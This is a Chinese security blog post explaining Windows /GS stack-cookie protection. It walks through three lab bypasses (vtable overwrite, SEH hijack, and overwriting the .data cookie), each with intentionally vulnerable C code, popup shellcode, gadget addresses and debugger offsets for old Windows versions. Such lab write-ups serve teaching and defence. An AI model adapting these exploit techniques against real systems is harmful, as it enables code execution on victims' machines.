---
title: 绕过GS安全编译的方法
date: 2017-07-04 13:51:38
categories: 安全技术
tags: [windows, GS]
---

### 1.介绍GS

VS设置GS开启：Project->project Properties->Configuration Properties->C/C++->Code Generation->Buffer Security Check

#### 1.1 GS工作原理

* 在所有函数调用发生时，向栈帧中压入额外的随机DWORD，这个随机数被称作"canary"，在IDA中被标注为“Security Cookie”。
* Security Cookie位于EBP之前，系统还将.data的内存区域中存放一个Security Cookie副本
* 当栈发生溢出时，Security Cookie将被首先淹没，之后才是EBP和返回地址
* 在函数返回之前，系统将执行额外的安全验证操作，即Security Check
* 在Security Check过程中，系统将比较栈中原先存放的Security Cookie和.data中副本的值，如果两者不吻合，说明栈帧中的Security Cookie已被破坏，即栈中已经溢出
* 当检测处溢出时，系统将进入异常处理流程，函数不会被正常返回，ret指令也不会被执行

![GS内存格局](/images/2017-07-04/gs.jpg)


#### 1.2 不会使用GS的情况

1. 函数不包括缓冲区
2. 函数被定义为具有变量参数列表
3. 函数使用无保护的关键字标记
4. 函数在第一个语句中包含内嵌汇编代码
5. 缓冲区不是8字节类型且大小不大于4字节

当然，也可以使用#pragma strict_gs_check(on)为任意类型的函数添加Security Cookie。

#### 1.3 其他栈保护措施

VS 2005及后续版本使用了变量重排技术，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量，同时还会将指针参数的字符串参数复制到内存中的低地址，防止函数参数被破坏。

![GS重排技术](/images/2017-07-04/gs_relocate.jpg)

#### 1.4 Security Cookie生成细节

* 系统以.data节的第一个双字作为Cookie的种子，或原始Cookie（所有函数的Cookie都用这个DWORD生成）
* 在程序每次运行时Cookie的种子都不同，因此种子具有很强的随机性
* 在栈帧初始化以后系统用ESP异或种子，作为当前函数的Cookie，以此作为不同函数之间的区别，并增加 Cookie的随机性
* 在函数返回前，用ESP还原出（异或）Cookie的种子

#### 1.5 GS优缺点

1. 修改栈帧中函数返回地址的经典攻击将被GS机制有效遏制
2. 基于改写函数指针的攻击，如C++虚函数的攻击，GS机制仍然很难防御
3. 针对异常处理机制的攻击，GS很难防御
4. GS是对栈帧的保护机制，因此很难防御堆溢出的攻击

### 2. 利用未保护的内存突破GS

这其实在前面已经介绍过，当缓冲区不是8字节类型且大小不大于4字节，系统是不会给予GS保护的，这时候就可以使用栈或堆溢出

### 3. 覆盖虚函数突破GS

#### 3.1 测试代码

<pre><code>
#include "stdafx.h"
#include "string.h"

class GSVirtual{
public:
    void gsv(char *src)
    {
        char buf[200];
        strcpy(buf, src);
        vir();
    }
    virtual void vir()
    {
    }
};

int main()
{
    GSVirtual test;
    test.gsv(
	"\xfc\x5e\x97\x7c\x90\x90\x90\x90\x90\x90\x90\x90\xb0\x9d\x93\x7c"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
	"\xF0\x20\x40\0"
    );
    return 0;
}

</code></pre>

<font color=#f00>说明：shellcode中头部的0x7c992b04为"pop edi, pop esi, retn"指令的地址，不同版本的系统中该地址可能不同</font>


#### 3.2 实验原理

实验思路：
1. 类GSVirtual中的gsv函数存在典型的栈溢出漏洞
2. 类GSVirtual中包含一个虚函数vir
3. 当gsv中的buf变量发生溢出的时候有可能影响虚表指针，如果可以控制虚表指针，将其指向我们可以控制的内存空间，就可以在程序调用时控制程序的流程。

实验环境

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3| |
|编译器|Visual Studio 2008| |
|编译选项|<font color=#f00>禁用优化选项</font>| |
|build版本|release版本| |

为了能够精准地淹没虚函数表，test.gsv中传入参数"\x90"*199+"\0"，在执行strcpy之后暂停
此时栈帧内容为
![传入参数后的栈帧内容](/images/2017-07-04/gs_stack.jpg)

从栈帧中可以看出，距离虚函数表地址还有20字节的内容。然后考虑一下执行过程，控制虚表指针后，可以<font color=#f00>让程序跳到虚表指针指向的虚表函数地址中去执行（即jmp [虚表指针内容]）</font>。过程如图，程序根据虚表指针找到虚表，然后从虚表中取出调用的虚函数地址，根据这个地址转入虚函数执行。

![虚函数执行过程](/images/2017-07-04/gs_stack2.jpg)

变量buff在内存中的位置不是固定的，需要考虑如何让虚表指针刚好指向shellcode的范围内。虽然原始参数为（0x004020F0）是位于虚表（0x004021C0）附近，所以我们直接淹没虚表地址。

虚表指针指向原始参数中的shellcode后，紧跟着一个call操作，也就是说还需要在执行这个call后还必须返回shellcode空间继续执行，这儿有个办法就是直接进入栈空间中的buff内执行shellcode。
![进入call之后的内存空间](/images/2017-07-04/gs_stack3.jpg)

从图中可以看出，此时Buff的地址存放在0x0012FE9C，位于ESP+4的位置，我们只要执行"pop pop retn"指令序列后就可以转到0x0012FE9C中执行。我们找到了ntdll.dll在0x7C975EFC处的"pop esi, pop edi, retn"指令。

但是在虚函数执行此地址处的函数指令的时候，retn之后会重新跳入栈顶指针0x7C975EFC处继续执行一遍"pop esi, pop edi, retn"指令

![第一次执行"pop pop retn"之后](/images/2017-07-04/gs_stack4.jpg)

为了能够让程序执行shellcode中关键内容，我们让这次执行"pop pop retn"后程序进入ntdll.dll中0x7c939db0中执行"push esp, retn"指令
![第二次执行"pop pop retn"之后](/images/2017-07-04/gs_stack5.jpg)

这时候执行push esp就将shellcode中的地址传入栈中，然后retn后就执行shellcode中内容

<font color=#f00>本次执行的过程与《0day安全》上讲的不一样，总觉得书上这个地方讲错了</font>

### 4. 攻击异常处理突破GS

#### 4.1 测试代码

<pre><code>
#include "stdafx.h"
#include "string.h"

char shellcode[] = 
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xA0\xFE\x12\x00";


void test(char *input)
{
	char buf[200];
	strcpy(buf, input);
	strcat(buf, input);
}

int main()
{
	test(shellcode);
}
</code></pre>

#### 4.2 实验原理

实验思路
1. 函数test存在典型的栈溢出漏洞
2. 在strcpy操作后变量buf会被溢出，当字符串足够长的时候程序的SEH异常处理句柄会被淹没
3. 由于strcpy溢出，覆盖了input的地址，会造成strcat从一个非法地址读取错误，这会触发异常，程序进入异常处理，这样就可以在程序检查Security Cookie前将程序流程劫持

实验环境

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows 2000 SP4| |
|编译器|Visual Studio 2005|Windows 2000最高支持VS2005 |
|编译选项|<font color=#f00>禁用优化选项</font>| |
|build版本|release版本| |


测试步骤
1. 首先用"\x90"*199+"\0"作为shellcode，按照实验环境编译，用OllyDbg加载程序，在程序执行strcpy后中断程序
执行完之后，发现shellcode起始位置为0x0012FEA0，距离栈顶最近的SEH位于0x0012FFb0+4。于是知道shellcode起始位置到最近的SEH句柄需要276字节。
2. shellcode: 168字节弹出对话框shellcode + 108*"\x90" + "\xA0\xFE\x12\x00"

### 5. 同时替换栈中和.data中的Cookie突破GS

#### 5.1 实验代码

<pre><code>
#include "stdafx.h"
#include "string.h"
#include "stdlib.h"

char shellcode[] = 
	"\x90\x90\x90\x90"	// new value of cookie in .data
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xF4\x6F\x82\x90"	// result of \x90\x90\x90\x90 xor EIP
	"\x90\x90\x90\x90"
	"\x94\xFE\x12\x00";  // address of shellcode 

void test(char *s, int i, char *src)
{
	char dest[200];
	if(i&lt;0x9995)
	{
		char *buf = s+i;
		*buf = *src;
		*(buf+1) = *(src+1);
		*(buf+2) = *(src+2);
		*(buf+3) = *(src+3);
		strcpy(dest, src);
	}
}
void main()
{
	char *str = (char *)malloc(0x10000);
	test(str, 0xffff3094, shellcode);
}
</code></pre>

#### 5.2 实验原理

实验思路：
1. main函数在堆中申请了0x10000字节的空间，并通过test函数对其空间的内容尽心操作
2. test函数对s+i到s+i+3的内存进行赋值，虽然函数对i进行了上限判断，但是没有判断i是否大于0，当i为负值时，s+i所指向的空间就会脱离main中申请的空间，进而有可能会指向.data区域
3. test函数中的strcpy存在典型的溢出漏洞

实验环境

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3| |
|编译器|Visual Studio 2008| |
|编译选项|<font color=#f00>禁用优化选项</font>| |
|build版本|release版本 ||

Security Cookie校验过程：
1. shellcode赋值为8*"\x90"，然后使用OllyDbg加载 运行程序，并中断在test函数中的if语句处，此实验中该语句地址0x00401013
2. <font color=#f0f>如下图所示，程序从0x0040300C(__security_cookie)处取出Cookie值，然后与EBP做一次异或，最后将异或之后的值放到EBP-4的位置作为次函数的Security Cookie。函数返回前的校验过程就是此过程的逆过程：程序从EBP-4的位置取出值，然后与EBP异或，最后与0x0040300C(__security_cookie)处的Cookie进行比较，如果两者一致则校验通过，否则转入校验失败的异常处理。</font><font color=#0f0>由于__security_cookie会随着实验而进行改变，所以此处可能会改变。在后面的实验中发现，这个地方的值为0x004030DC，所以得读者自己进行测试</font>
![Security Cookie生成过程](/images/2017-07-04/rip_gs.jpg)
3. 实验关键点就是在0x004030DC处写入我们的数据，而我们在main函数中通过malloc申请的空间起始位置是0x00410048<font color=#f00>将程序中断在malloc之后，call MALLOC之后，函数会将申请的空间起始地址保存在EAX并返回</font>。这个位置相对于0x00403000处于高址位置，可以通过向test函数中i参数传递一个负值来将指针str向0x00403000方向移动，通过计算得到i应设置为0xffff3094(-53100)就可以将str指向0x004030DC。
4. 将程序重新编译后，在strcpy处中断。此时0x004030DC被覆盖为0x90909090。将0x90909090与当前EBP异或的结果放到Security Cookie位置即可。此时异或的结果为0x90826FF4。
5. 调试发现dest起始位置为0x0012FE94，Security Cookie位于0x0012FF60，返回地址位于0x0012FF68.
6. shellcode组成： "\x90\x90\x90\x90"修改.data中Cookie + 168字节弹出对话框 + 32*"\x90" + "\xF4\x6F\x82\x90"Security Cookie + "\x90\x90\x90\x90\x94\xFE\x12\x00" 填充和返回地址覆盖



